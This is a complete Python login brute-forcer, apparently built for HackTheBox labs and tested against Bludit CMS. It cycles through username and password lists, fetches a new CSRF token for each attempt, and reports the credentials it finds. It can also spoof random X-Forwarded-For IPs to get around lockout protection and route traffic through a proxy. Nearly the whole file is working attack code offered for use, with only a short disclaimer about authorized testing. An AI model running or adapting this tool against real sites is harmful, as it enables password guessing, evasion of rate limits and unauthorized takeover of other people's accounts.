#!/usr/bin/env python3

description="""

-----------------------------------------------------------------------------
 A Web Login Brute Forcer (dependency-free & built with vibe coding & love)
-----------------------------------------------------------------------------

Description:
  A simple brute force login tester. Dependency free for faster deployment with 
  optional CSRF token support, cookie handling, proxy routing, debug output, and 
  progress tracking. Author: .m3rl1n
  
License: 
  No license. Hack it, crack it, break it, fork it, torch it, repack it. If you’re 
  reading this, you already own it. The field where I grow my fucks is barren ;)
  Fucks <=0
  
Disclaimer:
  This tool is provided for educational purposes and authorized security testing 
  only (e.g., CTFs, HackTheBox, labs you own or have permission for). Do not use 
  against systems without explicit consent. The author assumes and accepts no 
  liability for misuse or damage caused by this script. You ran it, you own it.
  
Tested On:
  HTB Blunder - Bludit CMS
  
Usage Examples:
  ./Web_Brute-Forcer.py -h
  ./Web_Brute-Forcer.py --T http://10.10.10.10/login -u admin -P passwords.txt -t 40
  ./Web_Brute-Forcer.py --T http://10.10.10.10/login -U users.txt -p Password1 --delay 2 -D
  ./Web_Brute-Forcer.py --T http://10.10.10.10/login -U users.txt -P passwords.txt --proxy http://127.0.0.1:8080

"""



# -------------------------------
# import native or common modules
# -------------------------------

import argparse # for handling command-line arguments
import sys      # for exiting on errors
import re       # for regex matching security tokens
import requests # for http requests and sessions
import random   # for generating spoofed X-Forwarded-For ip addresses
import time     # for throttling http requests and ETA calculation
import signal   # for handling control signals
import os       # for low level process control



# ----------------------------------------------------
# define colour codes for extra classy terminal output
# ----------------------------------------------------

ALERT    = "\033[91m"       # Red
SUCCESS  = "\033[92m"       # Green
WARNING  = "\033[93m"       # Yellow
INFORM   = "\033[94m"       # Blue
DEBUG    = "\033[96m"       # Cyan
ATTACK   = "\033[38;5;208m" # Orange
RESET    = "\033[0m"        # User Default



# --------------------------------------------------------
# custom argument parser setup - because defaults are ugly
# --------------------------------------------------------

# Custom formatter because the native adds unnessesary white space and looks messy
class CustomFormatter(argparse.RawTextHelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=28, width=110)

# create a command line argument parser with the custom formatter 
parser = argparse.ArgumentParser(description=description, formatter_class=CustomFormatter,
    add_help=False, usage=argparse.SUPPRESS) # supress the default helper, its messy

# define the arguments list
help = parser.add_argument_group("Help")
help.add_argument("-h", "--help", action="help", default=argparse.SUPPRESS, help="Show this help message and exit.")
required = parser.add_argument_group("Required Arguments")
required.add_argument("-t", "--target", required=True, metavar="", help="Target Url.")
required.add_argument("-u", "--username", metavar="", help="Single Username.")
required.add_argument("-U", "--userfile", metavar="", help="Usernames List.")
required.add_argument("-p", "--password", metavar="", help="Single Password.")
required.add_argument("-P", "--passfile", metavar="", help="Password List.")
optional = parser.add_argument_group("Optional Arguments")
optional.add_argument("-T", "--token_length", metavar="", help="Number of chars in the token string.")
optional.add_argument("-x", "--proxy", metavar="", help="Send traffic through a proxy (Example: -x http://127.0.0.1:8080)")
optional.add_argument("-D", "--debug", action="store_true", help="Turn on debug output.")
optional.add_argument("-d", "--delay", metavar="", type=float, default=0, help="Delay between attempts, in seconds (automated lockout avoidance).")
optional.add_argument("-S", "--spoof_ip", action="store_true", help="Enable X-Forwarded-For IP spoofing (automated lockout avoidance).")
overrides = parser.add_argument_group("Optional Overrides")
overrides.add_argument("-ss", "--success_string", metavar="", help="Know what success looks like? use a Regex/string override here.")
overrides.add_argument("-uf", "--user_field", default="username", metavar="", help="Override form field for username (default: username)")
overrides.add_argument("-pf", "--pass_field", default="password", metavar="", help="Override form field for password (default: password)")
overrides.add_argument("-tf", "--token_field", default="tokenCSRF", metavar="", help="Override form field for CSRF token (default: tokenCSRF)")

# now we need somewhere to store all this shit so we can use it later
args = parser.parse_args()

# enforce username and password exclusivity - yeah we could have used arg groups but the help formatting for those is ugly
if bool(args.username) == bool(args.userfile):
    parser.error("Provide exactly one of --username or --userfile.")
if bool(args.password) == bool(args.passfile):
    parser.error("Provide exactly one of --password or --passfile.")



# -------------------------------------------------
# m3rl1ns little helpers - like santa's, but better
# -------------------------------------------------

# hide/show the cursor otherwise updates in place look messy
def hide_cursor():
    sys.stdout.write("\033[?25l")
    sys.stdout.flush()
def show_cursor():
    sys.stdout.write("\033[?25h")
    sys.stdout.flush()
    
# clear the current line and print a message
def clean_line_and_msg(msg):
    sys.stdout.write("\033[K\n")
    print(f"{INFORM}{msg}{RESET}")
    sys.stdout.flush()
    
# handle Ctrl-C cleanly
def handle_interrupt(signum, frame):
    show_cursor()
    clean_line_and_msg("[i] Interrupted by user. Exiting...")
    sys.exit(1)
signal.signal(signal.SIGINT, handle_interrupt)   

# handle Ctrl-Z cleanly, and allow resume with fg
def handle_suspend(signum, frame):
    show_cursor()
    clean_line_and_msg("[i] Suspended by user (Ctrl-Z). Use 'fg' to resume.")
    signal.signal(signal.SIGTSTP, signal.SIG_DFL)
    os.kill(os.getpid(), signal.SIGTSTP)
signal.signal(signal.SIGTSTP, handle_suspend)



# --------------------------------------------
# pre-flight checks - configure all the things
# --------------------------------------------

# use a session object so we can get the right cookies
session = requests.Session()

# if the user needs a proxy, store it in the proxy variable
if args.proxy:
    proxy = {"http": args.proxy, "https": args.proxy}
    print(f"{INFORM}[i] Using proxy: {args.proxy}{RESET}")
else:
    proxy = None

# record the start time so we can later work out the ETA
start_time = time.time()  

# check if the host is even reachable
try:
    test = session.get(args.target, timeout=10, proxies=proxy)
    if test.status_code >= 400:
        print(f"{ALERT}[!] Host reachable but returned error code {test.status_code}{RESET}")
        sys.exit(1)
except requests.RequestException as e:
    err = str(e)
    if "Failed to establish a new connection" in err:
        print(f"{ALERT}[!] Unreachable URL: {args.target}{RESET}")
    elif "Max retries exceeded" in err:
        print(f"{ALERT}[!] Connection timed out: {args.target}{RESET}")
    else:
        print(f"{ALERT}[!] Request failed: {err}{RESET}")
    sys.exit(1)

# if the host is reachable, load the username or usernames and the password or passwords
if args.username:
    usernames = [args.username]
    print(f"{INFORM}[i] Using single username: {args.username}{RESET}")
elif args.userfile:
    try:
        with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
            usernames = [line.strip() for line in f if line.strip()]
        print(f"{INFORM}[i] Loaded {len(usernames)} usernames from file: {args.userfile}{RESET}")
    except FileNotFoundError:
        print(f"{ALERT}[!] File not found: {args.userfile}{RESET}")
        sys.exit(1)
if args.password:
    passwords = [args.password]
    print(f"{INFORM}[i] Using single password: {args.password}{RESET}")
elif args.passfile:
    try:
        with open(args.passfile, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"{INFORM}[i] Loaded {len(passwords)} passwords from file: {args.passfile}{RESET}")
    except FileNotFoundError:
        print(f"{ALERT}[!] File not found: {args.passfile}{RESET}")
        sys.exit(1)

# using the above loads, calculate the total number of attempts and define a simple progress tracker
total_attempts = len(usernames) * len(passwords)
attempt_count = 0

# attempt a bad login so we can see what that looks like and get a baseline
baseline_data = {
    args.user_field: "ABC_invalid_user_XYZ",
    args.pass_field: "ABC_invalid_pass_XYZ",
    "save": ""
}
baseline = session.post(args.target, data=baseline_data, proxies=proxy, allow_redirects=True, timeout=10)
baseline_len = len(baseline.text)
baseline_cookies = set(baseline.cookies.keys())
if args.debug:
    print(f"{INFORM}[i] Baseline failure response length: {baseline_len}{RESET}")

# attempt to see if a CSRF token likely required and abort if we don't see one
if not args.token_length:
    test_page = session.get(args.target, timeout=10, proxies=proxy)
    if re.search(r'name=["\']?[^"\'>]*csrf[^"\'>]*', test_page.text, re.I):
        print(f"{ALERT}[!] Target requires a CSRF token but none was supplied (-T). Exiting...{RESET}")
        sys.exit(1)

# define a the success regex here instead of in the loop to save our precious compute
success_regex = re.compile(args.success_string, re.I) if args.success_string else None

# define an ETA tracker - low sensitivity, we dont want it jumping around due to variable compute availability
start_time = time.time()
time_window = []
def update_eta(attempt_count, total_attempts, start_time, time_window):
    now = time.time()
    time_window.append(now)
    if len(time_window) > 50:
        time_window.pop(0)
    if len(time_window) > 1 and attempt_count % 25 == 0:
        avg_time = (time_window[-1] - time_window[0]) / (len(time_window) - 1)
        remaining = (total_attempts - attempt_count) * avg_time
        eta_h = int(remaining // 3600)
        eta_m = int((remaining % 3600) // 60)
        eta_s = int(remaining % 60)
        eta_str = f"{INFORM}[i] Estimated time remaining: {eta_h:02d}h {eta_m:02d}m {eta_s:02d}s{RESET}"
        sys.stdout.write("\033[F\033[K" + eta_str + "\n")
        sys.stdout.flush()

# this is the login loop that gets a fresh csrf token if required and tries to log in
def login(user, password):
    token_value = None
    if args.token_length and args.token_length.isdigit():
        try:
            r = session.get(args.target, timeout=10, proxies=proxy)
        except requests.RequestException as e:
            print(f"{ALERT}[!] Failed to fetch login page for token: {e}{RESET}")
            return False
        length = int(args.token_length)
        regex = rf'name="{args.token_field}".*?value="([A-Za-z0-9]{{{length}}})"'
        match = re.search(regex, r.text, re.I | re.S)
        if not match:
            print(f"{ALERT}[!] Token required (length {length}) but not found. Exiting...{RESET}")
            sys.exit(1)
        token_value = match.group(1)
        if args.debug:
            print(f"{DEBUG}[#] Extracted token: {token_value}{RESET}")
    else:
        # If target uses CSRF and no token supplied, fail immediately
        if "csrf" in args.token_field.lower():
            if args.debug:
                print(f"{DEBUG}[#] CSRF token missing for {user}:{password}, skipping attempt{RESET}")
            return False
    headers = {}
    if args.spoof_ip:
        headers['X-Forwarded-For'] = (
            f"{random.randint(80,89)}."
            f"{random.randint(1,254)}."
            f"{random.randint(1,254)}."
            f"{random.randint(1,254)}"
        )
    data = {
        args.user_field: user,
        args.pass_field: password,
        'save': ''
    }
    if token_value:
        data[args.token_field] = token_value
    try:
        r = session.post(args.target, data=data, headers=headers,
                         proxies=proxy, allow_redirects=False, timeout=10)
    except requests.RequestException as e:
        print(f"{ALERT}[!] Request failed during brute force: {e}{RESET}")
        return False
    page = r.text.lower()
    if args.debug:
        print(f"\n{DEBUG}[#] Attempt {user}:{password}{RESET}")
        print(f"{DEBUG}[#] CSRF Token: {token_value}{RESET}")
        print(f"{DEBUG}[#] Cookies: {session.cookies.get_dict()}{RESET}")
        print(f"{DEBUG}[#] Response code: {r.status_code}{RESET}")
        print(f"{DEBUG}[#] Response preview: {r.text[:200]} ...{RESET}\n")

    # lockout detection
    if r.status_code == 429 or any(x in page for x in ["too many attempts", "try again later", "locked", "banned"]):
        print(f"{WARNING}[!] Lockout or rate-limiting detected. Halting brute force.{RESET}")
        sys.exit(1)

    # success heuristics
    # 1. redirect away from the login page
    if r.is_redirect and "login" not in r.headers.get("Location", "").lower():
        print(f"{SUCCESS}[+] Redirected away from login page. Success with {user}:{password}{RESET}")
        return True
    # 2. persistent auth-related cookies?
    new_cookies = set(session.cookies.keys()) - baseline_cookies
    auth_keywords = ["auth", "session", "jwt", "token"]
    auth_cookies = [c for c in new_cookies if any(k in c.lower() for k in auth_keywords)]
    if auth_cookies:
        verify = session.get(args.target, proxies=proxy, timeout=10)
        if args.user_field.lower() not in verify.text.lower() and args.pass_field.lower() not in verify.text.lower():
            print(f"{SUCCESS}[+] Persistent auth cookie(s): {auth_cookies}. Success with {user}:{password}{RESET}")
            return True
    # 3. response length only if login form disappeared
    length_delta = abs(len(r.text) - baseline_len)
    if length_delta > 300 and args.user_field.lower() not in page and args.pass_field.lower() not in page:
        print(f"{SUCCESS}[+] Response length differs by {length_delta}, login form gone. Success with {user}:{password}{RESET}")
        return True
    return False



# ---------------------------
# go time - attack the target
# ---------------------------

# outside loop debug - print the target address
if args.debug:
    print(f"{DEBUG}[#] Target URL: {args.target}{RESET}")

# print static info related to number of attempts and eta
print(f"{INFORM}[i] Total attempts to perform: {total_attempts}{RESET}")
print(f"{INFORM}[i] Estimated time remaining: Calculating...{RESET}")  # reserved line for [>] Trying ...

# enter the brute-force loop baby yeah
hide_cursor()
start_time = time.time()
try:
    for user in usernames:
        for pwd in passwords:
            attempt_count += 1
            update_eta(attempt_count, total_attempts, start_time, time_window)
            sys.stdout.write("\033[K")  # Clear current line
            print(f"{ATTACK}[>] Trying {attempt_count}/{total_attempts} -> {user}:{pwd}{RESET}", end="\r")
            if login(user, pwd):
                show_cursor()
                sys.stdout.write("\033[K")  # clear current line
                print(f"\n{SUCCESS}[+] Found valid credentials: {user}:{pwd}{RESET}")
                sys.exit(0)
            if args.delay > 0:
                time.sleep(args.delay)
finally:
    show_cursor()

# if we get here - none of the passwords or username combinations worked
sys.stdout.write("\033[K")
print(f"{ALERT}[!] No valid credentials found.{RESET}")
